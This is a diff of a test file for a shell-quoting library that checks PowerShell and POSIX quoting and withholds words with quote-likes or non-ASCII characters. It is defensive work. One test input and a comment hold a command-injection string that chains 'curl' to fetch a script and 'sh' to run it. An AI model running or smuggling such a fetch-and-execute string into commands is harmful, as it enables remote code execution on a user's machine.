@@ -6,7 +6,7 @@ import { canonGuard } from '../plugin/hooks/canon-guard.mjs'
 import { actOn } from '../src/act.js'
 import { grantRows } from '../src/allowlist.js'
 import { handoffLine, loadHarness } from '../src/harness.js'
-import { offeredLine, quotedWord, shellArg, shellLine, shellWord, shellWords, withheldOn } from '../src/toon.js'
+import { hasControl, offeredLine, quotedWord, shellArg, shellLine, shellWord, shellWordExact, shellWords, withheldOn } from '../src/toon.js'
 import { CORPUS } from './shells.js'
 
 // PowerShell's reading of one word, after its tokenizer: a word opening with any of its five
@@ -45,7 +45,7 @@ describe('one quoter for every pasted word (row 239)', () => {
     expect(shellWord('--%', 'win32')).toBe("'--%'")
     expect(shellWord('a,b', 'win32')).toBe("'a,b'")
     expect(shellWord('@x', 'win32')).toBe("'@x'")
-    expect(shellWord("o'b\u2019c", 'win32')).toBe("'o''b\u2019\u2019c'")
+    expect(shellWord("o'b'c", 'win32')).toBe("'o''b''c'")
   })
 
   // Ruling R22. On Windows a line is pasted into PowerShell by a human and run through the agent's
@@ -66,16 +66,22 @@ describe('one quoter for every pasted word (row 239)', () => {
   // form as strings side by side, so a grant pasted there names another command (probed: `--cmd
   // 'echo ''x; curl …; sh x.sh'''` delivered `echo x; curl …; sh x.sh`). A word holding one is shown
   // and never offered on Windows; beside a risky character, both are named.
-  it('on Windows a word holding a quote-like is withheld, and named (row 239, ruling R22)', () => {
+  it('on Windows the straight quote is withheld and named, a curly one everywhere (row 239, rulings R22, R27)', () => {
     const quotes = (chars: string): string =>
       `not offered on Windows \u2014 it holds ${chars}, which PowerShell and Git Bash read differently`
     expect(withheldOn(['trust', 'p1', '--cmd', "echo 'x; curl -o x.sh example.invalid/p; sh x.sh'"], 'win32')).toBe(quotes("'"))
-    for (const q of ["'", '\u2018', '\u2019', '\u201a', '\u201b']) expect(withheldOn([`a${q}b`], 'win32'), q).toBe(quotes(q))
-    // named in the set's order, not the order the words hold them
-    expect(withheldOn(['\u201bx', "y'"], 'win32')).toBe(quotes("' \u201b"))
+    const nonAscii = "not offered \u2014 it holds a character outside printable ASCII, which a terminal's line editor can read as a command"
+    expect(withheldOn(["a'b"], 'win32')).toBe(quotes("'"))
+    expect(withheldOn(["a'b"], 'darwin')).toBeUndefined()
+    // beside a risky character, both are named, in the set's order
     expect(withheldOn(["a&b'c", '100%'], 'win32')).toBe(`${withheld('& %')}, and ', which PowerShell and Git Bash read differently`)
     expect(offeredLine(['git', 'checkout', '--', "d'x.html"], 'win32')).toBeUndefined()
-    expect(withheldOn(["it's", '\u2019'], 'darwin')).toBeUndefined()
+    // Ruling R27: the four curly quote-likes are not ASCII, so they are withheld on EVERY platform by
+    // the printable-ASCII rule, which takes the straight quote's place in the win32 message for them.
+    for (const q of [0x2018, 0x2019, 0x201a, 0x201b].map((c) => String.fromCodePoint(c))) {
+      expect(withheldOn([`a${q}b`], 'win32'), q).toBe(nonAscii)
+      expect(withheldOn([`a${q}b`], 'darwin'), q).toBe(nonAscii)
+    }
   })
 
   // Ruling R22, both halves at once: every word Windows offers reads back as the word it was under
@@ -87,6 +93,8 @@ describe('one quoter for every pasted word (row 239)', () => {
     const offered = words.filter((w) => withheldOn([w], 'win32') === undefined)
     expect(offered).toContain('C:\\w\\repo')
     expect(offered).not.toContain("it's")
+    // Ruling R27: a non-ASCII word is never among the offered, on any platform
+    expect(offered).not.toContain('über plan')
     for (const w of offered) {
       expect(psRead(shellWord(w, 'win32')), JSON.stringify(w)).toBe(w)
       expect(shellWords(shellWord(w, 'win32')), JSON.stringify(w)).toEqual([w])
@@ -119,12 +127,35 @@ describe('one quoter for every pasted word (row 239)', () => {
       .toBe("git checkout HEAD -- 'specs/x\\nrun: touch M9 #.md'")
   })
 
+  // Ruling R27. A word holding any character outside printable ASCII is withheld on every platform —
+  // an interactive shell's line editor reads a byte above 0x7f as a Meta key and can run a line-editing
+  // command — and `shellWord` spells it out (`visible`), so the shown line is printable ASCII and
+  // never, itself, holds a character the editor would act on. The exempt log path keeps its bytes.
+  it('a word outside printable ASCII is withheld everywhere, and spelled (row 239, ruling R27)', () => {
+    const nonAscii = "not offered — it holds a character outside printable ASCII, which a terminal's line editor can read as a command"
+    const words = ['über', 'х', ' x', 'a·b', String.fromCodePoint(0x1f600), String.fromCodePoint(0x2019)]
+    for (const platform of ['darwin', 'linux', 'win32'] as const) {
+      for (const w of words) {
+        expect(withheldOn(['adopt', w], platform), `${platform} ${JSON.stringify(w)}`).toBe(nonAscii)
+        expect(hasControl(shellWord(w, platform)), `${platform} ${JSON.stringify(w)}`).toBe(false)
+        expect(offeredLine(['git', 'checkout', '--', w], platform), platform).toBeUndefined()
+      }
+    }
+    expect(shellWord('a·b', 'darwin')).toBe("'a\\xb7b'")
+    expect(shellWord('х', 'win32')).toBe("'\\u{445}'")
+    // exempt (the plan's B5): the watch line's local log path and the handoff's home keep their bytes
+    expect(shellWordExact('/U/über/d.log', 'linux')).toBe("'/U/über/d.log'")
+    expect(quotedWord('/U/über', 'darwin')).toBe("'/U/über'")
+  })
+
   it("a quoted Windows word reads back exact under PowerShell's single-quote rule", () => {
-    for (const w of CORPUS) expect(psRead(shellWord(w, 'win32')), JSON.stringify(w)).toBe(w)
+    for (const w of CORPUS.filter((w) => withheldOn([w], 'win32') === undefined)) {
+      expect(psRead(shellWord(w, 'win32')), JSON.stringify(w)).toBe(w)
+    }
   })
 
   it('a quoted POSIX word reads back exact through shellWords', () => {
-    for (const w of CORPUS) expect(shellWords(shellLine(['witness', w], 'darwin')), JSON.stringify(w)).toEqual(['witness', w])
+    for (const w of CORPUS.filter((w) => withheldOn([w], 'darwin') === undefined)) expect(shellWords(shellLine(['witness', w], 'darwin')), JSON.stringify(w)).toEqual(['witness', w])
   })
 
   it('quotedWord quotes every word, as the handoff prints its path and /witness', () => {
@@ -162,9 +193,12 @@ describe('one quoter for every pasted word (row 239)', () => {
       const claude = loadHarness('claude-code')
       if (!claude.ok) throw new Error('claude-code')
       const risky = ['&', '|', '^', '<', '>', '"', '%', '!'].map((c) => [c, withheld(c), c] as const)
-      const quotes = ["'", '\u2018', '\u2019', '\u201a', '\u201b']
-        .map((c) => [c, `not offered on Windows \u2014 it holds ${c}, which PowerShell and Git Bash read differently`, c + c] as const)
-      for (const [c, why, inPs] of [...risky, ...quotes]) {
+      const straight = [["'", `not offered on Windows \u2014 it holds ', which PowerShell and Git Bash read differently`, "''"] as const]
+      // Ruling R27: each curly quote-like is not ASCII, so it is withheld on every platform with the
+      // printable-ASCII message; the handoff keeps and doubles it, as PowerShell reads it (exempt).
+      const nonAscii = "not offered \u2014 it holds a character outside printable ASCII, which a terminal's line editor can read as a command"
+      const curly = [0x2018, 0x2019, 0x201a, 0x201b].map((n) => String.fromCodePoint(n)).map((c) => [c, nonAscii, c + c] as const)
+      for (const [c, why, inPs] of [...risky, ...straight, ...curly]) {
         expect(actOn('win32', ['trust', 'p1', '--cmd', `x${c}y`]).withheld, c).toBe(why)
         expect(grantRows('p1', { cmd: `x${c}y` }, 'win32').filter((r) => r.includes('--cmd')), c).toEqual([])
         expect(offeredLine(['git', 'checkout', '--', `d${c}.html`], 'win32'), c).toBeUndefined()
